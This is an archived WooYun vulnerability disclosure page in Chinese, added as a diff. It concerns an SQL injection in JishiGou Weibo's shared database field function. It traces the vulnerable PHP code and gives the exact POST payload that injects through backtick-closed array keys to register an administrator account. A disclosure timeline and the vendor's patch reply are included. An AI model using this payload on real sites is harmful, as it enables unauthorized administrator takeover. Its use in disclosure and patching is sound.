@@ -1,0 +1,307 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		记事狗微博全版本SQL注入漏洞可直接注册管理员2  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		记事狗微博全版本SQL注入漏洞可直接注册管理员2  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-11-19 11:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-22：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-09：	细节向普通白帽子公开<br/>
+									2013-12-29：	细节向实习白帽子公开<br/>
+									2014-02-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">每个月总有那么几天会发几个。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这次的问题依然是一个通用函数，而且涉及面比较广，用到该函数的全部存在注入。。。好好改改。<br />
+<br />
+因为密码有salt，所以爆管理账号密码意义不大，直接在注册的页面注射成管理员。<br />
+<br />
+wap/modules/member.mod.php<br />
+<br />
+</p><pre><code>function DoRegister() <br />
+	{<br />
+				if(MEMBER_ID != 0 AND false == $this-&gt;IsAdmin)<br />
+		{<br />
+			$this-&gt;Messager(&#039;您已经是注册用户，无需再注册！&#039;, -1);<br />
+		}<br />
+<br />
+......<br />
+		<br />
+        $this-&gt;Post = array_iconv(&#039;UTF-8&#039;, $this-&gt;Config[&#039;charset&#039;], $this-&gt;Post);<br />
+		$password = $this-&gt;Post[&#039;password&#039;]; //密码<br />
+		$email = $this-&gt;Post[&#039;email&#039;]; //email<br />
+		$username = $nickname = $this-&gt;Post[&#039;nickname&#039;]; //用户名<br />
+<br />
+		<br />
+		if(strlen($password) &lt; 5)<br />
+        {<br />
+			$this-&gt;Messager(&quot;密码过短，请设置至少5位&quot;,-1);<br />
+		}<br />
+<br />
+		<br />
+<br />
+		$uid = jsg_member_register($nickname, $password, $email);//注册,不是关键函数，步过。<br />
+		if($uid &lt; 1)<br />
+		{<br />
+			$regconf = ConfigHandler::get(&#039;register&#039;);<br />
+			$rets = array(<br />
+	        	&#039;0&#039; =&gt; &#039;【注册失败】有可能是站点关闭了注册功能&#039;,<br />
+	        	&#039;-1&#039; =&gt; &#039;帐户/昵称 不合法，含有不允许注册的字符，请尝试更换一个。&#039;,<br />
+	        	&#039;-2&#039; =&gt; &#039;帐户/昵称 不允许注册，含有被保留的字符，请尝试更换一个。&#039;,<br />
+	        	&#039;-3&#039; =&gt; &#039;帐户/昵称 已经存在了，请尝试更换一个。&#039;,<br />
+	        	&#039;-4&#039; =&gt; &#039;Email 不合法，请输入正确的Email地址。&#039;,<br />
+	        	&#039;-5&#039; =&gt; &#039;Email 不允许注册，请尝试更换一个。&#039;,<br />
+	        	&#039;-6&#039; =&gt; &#039;Email 已经存在了，请尝试更换一个。&#039;,<br />
+				&#039;-7&#039; =&gt; &#039;您的IP地址 &#039; . $GLOBALS[&#039;_J&#039;][&#039;client_ip&#039;] . &#039; 已经被限制注册了（一个IP地址 &#039;.$regconf[&#039;time_html&#039;].&#039; 之内，最多只能注册 &#039;.$regconf[&#039;limit&#039;].&#039; 个用户），请稍后再试或联系管理员&#039;,<br />
+	        );<br />
+<br />
+	        $this-&gt;Messager($rets[$uid], null);<br />
+		}<br />
+<br />
+		<br />
+		$datas = array();<br />
+		$datas[&#039;uid&#039;] = $uid;<br />
+		$datas[&#039;province&#039;] = $this-&gt;Post[&#039;province&#039;]; 		$datas[&#039;city&#039;] = $this-&gt;Post[&#039;city&#039;];		if($this-&gt;_sms_register())<br />
+		{<br />
+			$datas[&#039;phone&#039;] = $sms_bind_num;<br />
+		}<br />
+<br />
+		jtable(&#039;members&#039;)-&gt;update($datas);//跟进0x01<br />
+......<br />
+	}</code></pre><p class='detail'><br />
+<br />
+include/function/global.func.php 0x01<br />
+<br />
+</p><pre><code>static function update($table, $data, $condition, $unbuffered = false, $low_priority = false)<br />
+	{<br />
+		$sql = DB::field($data); //问题出在自定义field函数上，跟进<br />
+		$cmd = &quot;UPDATE &quot;.($low_priority ? &#039;LOW_PRIORITY&#039; : &#039;&#039;);<br />
+		$table = DB::table($table);<br />
+		$res = DB::query(&quot;$cmd $table SET $sql &quot;.DB::where($condition), $unbuffered ? &#039;UNBUFFERED&#039; : &#039;&#039;);<br />
+		return $res;<br />
+	}<br />
+<br />
+static function field($array, $glue = &#039;,&#039;, $is_where=0) {<br />
+		$sql = $comma = &#039;&#039;;<br />
+		<br />
+		foreach ($array as $k =&gt; $v) {<br />
+			$s = &#039;&#039;;<br />
+			<br />
+			if(is_array($v)) {//遍历传递过来的数组的值，检查每一个值是否为数组，是数组则往下执行。<br />
+				<br />
+				$g = $v[&#039;glue&#039;];把键名为glue的数组的值赋值给$g<br />
+				if($g) {<br />
+					$kk = ($v[&#039;key&#039;] ? $v[&#039;key&#039;] : $k); //把键名为key的数组的值赋值给$kk<br />
+					$vv = $v[&#039;val&#039;];//把键名为vlue的数组的值赋值给$vv<br />
+					switch ($g) {//$g就是符号，我们构造$g为等号，也就是构造$v[&#039;glue&#039;]的值为=号。<br />
+						case &#039;=&#039;:<br />
+						case &#039;&gt;&#039;:<br />
+						case &#039;&lt;&#039;:<br />
+						case &#039;&lt;&gt;&#039;:<br />
+						case &#039;&gt;=&#039;:<br />
+						case &#039;&lt;=&#039;:<br />
+							$s = &quot;`{$kk}`{$g}&#039;{$vv}&#039;&quot;; /*$kk的值,$vv的值都需要构造，我们虽然不能引入单引号，但是我们能引入反引号，反引号不受GPC的限制，$kk在反引号内，而且$kk我们可控。所以只要用到了这个field函数，随便找一个我们能控制的域，把他以数组的方式提交即可。比如：$_POST[&#039;str&#039;]这个域，我们提交：str[glue]==&amp;str[val]=endvlue&amp;str[key]=beginkey`=beginvalue,`endkey<br />
+就成了<br />
+`beginkey`=beginvalue,`endkey`=&#039;endvlue&#039;<br />
+关键点就在于这个str[key]闭合反引号<br />
+比如我的这个例子注册管理员，需要role_id=2,role_type=admin<br />
+我们提交province[glue]==&amp;province[val]=admin&amp;province[key]=role_id`=2,`role_type<br />
+即可<br />
+*/<br />
+<br />
+							break;<br />
+						case &#039;-&#039;:<br />
+						case &#039;+&#039;:<br />
+						case &#039;|&#039;:<br />
+						case &#039;&amp;&#039;:<br />
+						case &#039;^&#039;:<br />
+							$s = &quot;`{$kk}`=`{$kk}`{$g}&#039;{$vv}&#039;&quot;;<br />
+							break;<br />
+						case &#039;like&#039;:<br />
+							$s = &quot;`{$kk}` LIKE(&#039;{$vv}&#039;)&quot;;<br />
+							break;<br />
+						case &#039;in&#039;:<br />
+						case &#039;notin&#039;:<br />
+							$s = &quot;`{$kk}`&quot;.(&#039;notin&#039;==$g ? &#039; NOT&#039; : &#039;&#039;).&quot; IN(&quot;.jimplode($vv).&quot;)&quot;;<br />
+							break;<br />
+						default:<br />
+							exit(&quot;glue $g is invalid&quot;);<br />
+					}<br />
+				} else {<br />
+					if($is_where) {<br />
+						$s = &quot;`{$k}` IN(&quot;.jimplode($v).&quot;)&quot;;<br />
+						<br />
+					}<br />
+				}<br />
+			} else {<br />
+				$s = &quot;`{$k}`=&#039;$v&#039;&quot;;<br />
+			}<br />
+<br />
+			if($s) {<br />
+				$sql .= $comma . $s;<br />
+				$comma = $glue;<br />
+			}<br />
+		}<br />
+<br />
+		return $sql;<br />
+	}</code></pre><p class='detail'><br />
+<br />
+POST提交<br />
+<br />
+password=123456&amp;nickname=test1test&amp;email=test1test@test.com&amp;province[glue]==&amp;province[val]=admin&amp;province[key]=role_id`=2,`role_type<br />
+<br />
+到<br />
+<br />
+http://localhost/jishigou/wap/?mod=member&amp;code=doregister<br />
+<br />
+即可注册管理员。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/19114212b69c50a3c65dbf09043ff7e29d770f36.png" target="_blank"><img src="../images/19114212b69c50a3c65dbf09043ff7e29d770f36.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19114222f476d31badd16b62aa28d363421bb5a2.png" target="_blank"><img src="../images/19114222f476d31badd16b62aa28d363421bb5a2.png" alt="2.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/19114231807f08e49eca4d24c30e7049b941044a.png" target="_blank"><img src="../images/19114231807f08e49eca4d24c30e7049b941044a.png" alt="3.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/191142384b27a2f663ee505fd2b181d39215947f.png" target="_blank"><img src="../images/191142384b27a2f663ee505fd2b181d39215947f.png" alt="4.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">继续求包养。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043311" title="记事狗微博全版本SQL注入漏洞可直接注册管理员2">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2013-11-19 11:54</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢 Chora@乌云 的反馈，这个问题影响到V4.x版本，已经有发布补丁包修复了 http://t.jishigou.net/topic/250858</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43311";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
